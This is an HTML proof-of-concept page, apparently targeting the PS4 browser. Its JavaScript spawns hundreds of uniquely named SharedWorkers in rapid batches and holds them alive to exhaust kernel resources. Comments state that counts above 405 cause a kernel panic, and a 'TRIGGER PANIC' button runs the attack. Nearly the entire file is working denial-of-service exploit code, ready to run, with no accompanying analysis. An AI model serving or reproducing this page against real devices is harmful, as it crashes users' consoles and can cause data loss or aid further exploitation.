<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Kernel Resource Exhaustion PoC</title>
</head>
<body>

    <h1>SharedWorker Kernel Panic PoC</h1>
    
    <p>Target limit > 400 Safe.</p>
    <p>Target limit > 401-405 triggers Freeze.</p>
    <p>Target limit > 405+ Starts Kernel Panic.</p>

    <label>
        Workers Target: <input type="number" id="count" value="600">
    </label>
    <button onclick="run()">TRIGGER PANIC</button>

    <div id="log">Ready.<br></div>

    <script>
        // Array to keep workers alive (prevent GC and force Kernel allocation)
        let keeps = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
        }

        function run() {
            const limit = parseInt(document.getElementById('count').value);
            log(`Allocating ${limit} SharedWorkers...`);
            log("System instability expected around 400.");
            log("Kernel Panic expected above 405.");

            if (!window.SharedWorker) return log("SharedWorker API not supported.");

            let created = 0;
            
            // Fast interval to flood the kernel allocator
            const interval = setInterval(() => {
                // Batch creation to speed up the process
                for (let i = 0; i < 5; i++) {
                    try {
                        // Using a unique name (timestamp + counter) forces the Kernel 
                        // to create a new IPC handle/process structure for each worker.
                        const id = "kpanic_" + Date.now() + "_" + created;
                        
                        // Create and hold reference
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", id);
                        sw.port.start(); // Ensure port is active and handle is allocated
                        keeps.push(sw);
                        
                        created++;

                        if (created >= limit) {
                            clearInterval(interval);
                            log(`Limit reached (${limit}). Waiting for system crash...`);
                            return;
                        }

                    } catch (e) {
                        // If the browser catches the error, log it.
                        // However, the Kernel usually panics before this catch block triggers.
                        clearInterval(interval);
                        log(`Alloc Error at ${created}: ${e.message}`);
                        return;
                    }
                }
                
                // Update log every 50 creations to avoid UI lag interfering with the test
                if (created % 50 === 0) log(`Active: ${created}...`);

            }, 5);
        }
    </script>
</body>
</html>


